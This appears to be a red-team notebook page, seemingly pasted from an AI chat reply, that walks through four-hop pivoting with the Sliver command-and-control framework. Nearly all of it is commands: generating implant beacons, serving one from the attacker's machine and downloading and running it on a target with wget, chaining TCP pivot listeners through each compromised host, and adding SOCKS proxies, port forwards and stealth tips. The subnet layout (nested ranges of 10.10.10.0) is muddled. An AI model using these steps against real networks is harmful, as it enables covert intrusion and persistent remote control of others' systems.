---
icon: skull
---

# QuaTriple -Pivot - 4time



Got it! Let me explain the **multi-hop pivoting** process with Sliver in detail.

### Network Layout

<figure><img src="../../../../.gitbook/assets/image (150).png" alt=""><figcaption></figcaption></figure>

```
Kali (Attacker)
    ↓
10.10.10.0/23 (1st Network - Direct Access)
    ↓
10.10.10.0/24 (2nd Network)
    ↓
10.10.10.0/25 (3rd Network)
    ↓
10.10.10.0/26 (4th Network - Final Target)
```

***

### Complete Multi-Hop Pivoting Flow

#### **Level 0: Your Kali Machine (Attacker)**

```bash
# Start Sliver server
sliver-server

# Start MTLS listener (most secure option)
sliver > mtls -L 0.0.0.0 -l 8888
```

**Why MTLS?** Encrypted, authenticated, harder to detect.

***

#### **Level 1: First Compromised Host (10.10.10.0/23 network)**

**Step 1: Generate beacon for first target**

```bash
sliver > generate beacon \
    --mtls <YOUR_KALI_IP>:8888 \
    --os linux \
    --arch amd64 \
    --save /tmp/beacon1.elf
```

**Step 2: Transfer and execute on target**

```bash
# Option A: SCP if you have credentials
scp /tmp/beacon1.elf user@10.10.10.5:/tmp/

# Option B: HTTP server
python3 -m http.server 8000
# On target: wget http://<kali_ip>:8000/beacon1.elf && chmod +x beacon1.elf && ./beacon1.elf
```

**Step 3: Wait for beacon callback**

```bash
sliver > beacons
# You'll see your beacon listed
sliver > use <beacon_id>
```

**Step 4: Setup first pivot (TCP Pivot)**

```bash
sliver (beacon1) > pivots tcp -l 9001
# This opens a listener on port 9001 on the compromised host
```

**What happened?** You now have a "relay" on the first host. Next beacons will connect through THIS host.

***

#### **Level 2: Second Host (10.10.10.0/24 network)**

**Step 1: Generate beacon that connects through first pivot**

```bash
sliver > generate beacon \
    --mtls 10.10.10.5:9001 \
    --os linux \
    --arch amd64 \
    --save /tmp/beacon2.elf
```

**Key difference:** The `--mtls` now points to the **first compromised host's IP and pivot port**, NOT your Kali IP!

**Step 2: Transfer from first host to second**

```bash
# Use beacon1 to upload and execute
sliver (beacon1) > upload /tmp/beacon2.elf /tmp/beacon2.elf
sliver (beacon1) > shell
# In shell, transfer to 2nd host
scp /tmp/beacon2.elf user@10.10.10.20:/tmp/
# Or use curl/wget if you setup HTTP server on beacon1
```

**Step 3: Execute on second host**

```bash
# From beacon1 shell or directly if you have access
ssh user@10.10.10.20
chmod +x /tmp/beacon2.elf
./beacon2.elf &
```

**Step 4: Setup second pivot**

```bash
sliver > beacons  # Check for new beacon
sliver > use <beacon2_id>
sliver (beacon2) > pivots tcp -l 9002
```

***

#### **Level 3: Third Host (10.10.10.0/25 network)**

**Step 1: Generate beacon3**

```bash
sliver > generate beacon \
    --mtls 10.10.10.20:9002 \
    --os linux \
    --arch amd64 \
    --save /tmp/beacon3.elf
```

**Step 2: Transfer via beacon2**

```bash
sliver (beacon2) > upload /tmp/beacon3.elf /tmp/beacon3.elf
sliver (beacon2) > shell
# Transfer to 3rd host
scp /tmp/beacon3.elf user@10.10.10.30:/tmp/
```

**Step 3: Execute and setup pivot**

```bash
# Execute on 3rd host
ssh user@10.10.10.30
./beacon3.elf &

# Back in Sliver
sliver > use <beacon3_id>
sliver (beacon3) > pivots tcp -l 9003
```

***

#### **Level 4: Final Target (10.10.10.0/26 network)**

**Step 1: Generate final beacon**

```bash
sliver > generate beacon \
    --mtls 10.10.10.30:9003 \
    --os linux \
    --arch amd64 \
    --save /tmp/beacon4.elf
```

**Step 2: Transfer via beacon3**

```bash
sliver (beacon3) > upload /tmp/beacon4.elf /tmp/beacon4.elf
sliver (beacon3) > shell
# Transfer to final target
scp /tmp/beacon4.elf user@10.10.10.40:/tmp/
```

**Step 3: Execute and access**

```bash
# Execute on final target
./beacon4.elf &

# In Sliver
sliver > use <beacon4_id>
sliver (beacon4) > shell
# You're now in the final network!
```

***

### Visual Flow Chart

```
┌─────────────┐
│ Kali Linux  │ MTLS Listener: 0.0.0.0:8888
└──────┬──────┘
       │ Beacon1 connects here
       ↓
┌─────────────┐
│  Host 1     │ TCP Pivot: 9001
│ 10.10.10.5  │
└──────┬──────┘
       │ Beacon2 connects here
       ↓
┌─────────────┐
│  Host 2     │ TCP Pivot: 9002
│ 10.10.10.20 │
└──────┬──────┘
       │ Beacon3 connects here
       ↓
┌─────────────┐
│  Host 3     │ TCP Pivot: 9003
│ 10.10.10.30 │
└──────┬──────┘
       │ Beacon4 connects here
       ↓
┌─────────────┐
│  Host 4     │ FINAL TARGET
│ 10.10.10.40 │
└─────────────┘
```

***

### Important Concepts

#### **Beacon vs Session**

| Feature    | Beacon                                | Session                     |
| ---------- | ------------------------------------- | --------------------------- |
| Connection | Asynchronous (checks in periodically) | Real-time interactive       |
| Stealth    | High (less traffic)                   | Lower (constant connection) |
| Speed      | Slower (waits for check-in)           | Instant                     |
| Use Case   | Initial access, persistence           | Active exploitation         |

**Recommendation:** Use **beacons** for pivoting. Once you're stable, convert to interactive:

```bash
sliver (beacon) > interactive
```

#### **Listener Types**

| Type           | When to Use         | Pros                | Cons                     |
| -------------- | ------------------- | ------------------- | ------------------------ |
| **MTLS**       | Direct C2, pivoting | Encrypted, secure   | Might be blocked         |
| **HTTP/HTTPS** | Firewall bypass     | Blends with traffic | Slower                   |
| **DNS**        | Extreme stealth     | Works through DNS   | Very slow                |
| **TCP**        | Fast pivoting       | Fast, simple        | Not encrypted by default |

***

### Make Sure

#### **1. Check Beacon Status**

```bash
sliver > beacons
# Shows all active beacons, their IDs, check-in times
```

#### **2. Manage Multiple Pivots**

```bash
sliver > pivots
# Lists all active pivot listeners
```

#### **3. Port Forwarding (Alternative Method)**

If you want to access services directly:

```bash
sliver (beacon1) > portfwd add -r 10.10.10.20:22 -l 2222
# Now SSH to localhost:2222 on Kali = 10.10.10.20:22
```

#### **4. SOCKS Proxy (For Flexible Access)**

```bash
sliver (beacon1) > socks5 start
# Use proxychains to route any tool through the pivot
```

#### **5. Beacon Check-in Time**

```bash
# Set beacon to check in every 5 seconds (faster response)
sliver > generate beacon --mtls <ip>:8888 --seconds 5 --jitter 1
```

#### **6. Windows Targets**

For Windows hosts, change the generation:

```bash
sliver > generate beacon --mtls <ip>:port --os windows --arch amd64 --format exe
```
